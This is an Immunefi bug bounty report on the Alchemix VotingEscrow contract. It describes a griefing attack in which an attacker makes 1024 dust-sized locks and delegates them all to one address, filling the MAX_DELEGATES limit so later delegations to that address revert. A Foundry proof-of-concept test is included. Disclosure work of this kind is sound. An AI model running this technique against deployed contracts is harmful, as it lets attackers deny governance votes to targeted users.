# 30704 - \[SC - Medium] Griefing an account from getting votes delegate...

Submitted on May 5th 2024 at 09:56:52 UTC by @Shahen for [Boost | Alchemix](https://immunefi.com/bounty/alchemix-boost/)

Report ID: #30704

Report type: Smart Contract

Report severity: Medium

Target: <https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/VotingEscrow.sol>

Impacts:

* Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Brief/Intro

Assume there's three addresse's (Bob,Alex and Maya). Maya got `1e18` of `bpt tokens` which she locked in `VotingEscrow` contract and received a tokenId of the created `veALCX`. Maya is hoping to delegate her votes to Alex now. But Bob is a malicious actor, He locks `0.0000001 ether of bpt` in the `VotingEscrow` contract 1024 times.Therefore bob recieves 1024 tokenId's for a total of `0.0001024 ether of bpt` locked.

Now bob delegates his votes from each of his tokenId's to Alex,So alex got votes from 1024 tokenId's. So what bob have done here is a grief, If you look at line 1110 under `_moveAllDelegates()` internal function. There's a require condition that checks the total number of delegates the destioation(dst) has and if its <= `MAX_DELEGATES` which is 1024. So since bob delegated votes from 1024 tokenId's to Alex, When Maya tries to delegate votes from her tokenId that she received from locking `1e18`, The delegation will revert as the require statement fails. So this is how bob griefed Alex from getting votes delegated to him. Basically bob used his `0.0001024*10**18 bpt` total locked deposit to grief Alex, But bob can use any amount less than `0.0001024*10**18 bpt`,I just used that in the test. Ofcourse Alex would be able to delegate and clear out the unworthy votes sent by bob,But Bob can do the griefing again.

Please refer to the below Foundry POC demonstrating the explained scenario.

## Vulnerability Details

Same as the Brief/Intro

## Impact Details

A malicious actor can grief another address from getting votes delegated to it by maxing out the `MAX_DELEGATES` limit.

## References

<https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/VotingEscrow.sol>

## Proof of Concept

Paste the below testfile under src/test and run.

```
// SPDX-License-Identifier: GPL-3
pragma solidity ^0.8.15;

import "./BaseTest.sol";

contract VotingEscrowGriefTest is BaseTest {
    uint256 internal constant THREE_WEEKS = 3 weeks;
    address bob = address(0x1); // Griefer
    address alex = address(0x2); // victim
    address maya = address(0x3);

    function setUp() public {
        setupContracts(block.timestamp);
    }

    
   
    
    function test_delegate_grief() public {

// 1.) Bob has 0.0001024 bpt.

        hevm.startPrank(bob);
        deal(bpt,bob,0.0001024 ether);
        IERC20(bpt).approve(address(veALCX), 0.0001024 ether);
        
// 2.) Bob aquires multiple tokenId's by locking 0.0000001 bpt * 1024 times, So in total bob got <1024 tokenId's. 
// 3.) Since bob now has greater than or equal to 1024 tokenId's,Bob delegates votes from all of his tokenId's to Alex.    
        
        
        for (uint i = 0; i < 1024; i++) {
            uint256 tokenId = veALCX.createLock(0.0000001 ether, THREE_WEEKS, false);
            assertEq(veALCX.ownerOf(tokenId), bob);
            veALCX.delegate(alex);

        }

        
    

        hevm.stopPrank();
// 4.) Now Maya who locked 1e18 worth of bpt tries to delegate vote to alex.
// 5.) But the delegation revert as there's a limit of 1024 max delegates per dst account.
// 6.) Basically Bob delegated votes to Alex from 1024 different tokenId's, And since theres a max delagate limit of 1024,No one would be able to delegate votes to alex.
// 7.) This way Bob griefed Alex by getting votes delegated to him.
        hevm.startPrank(maya);
        deal(bpt,maya,1e18);
        IERC20(bpt).approve(address(veALCX), 1e18);
        uint256 tokenId = veALCX.createLock(1e18, THREE_WEEKS, false);
        assertEq(veALCX.ownerOf(tokenId), maya);
        hevm.expectRevert(abi.encodePacked("dst would have too many tokenIds"));
        veALCX.delegate(alex);
        hevm.stopPrank();
        

        
    }

    
}

```
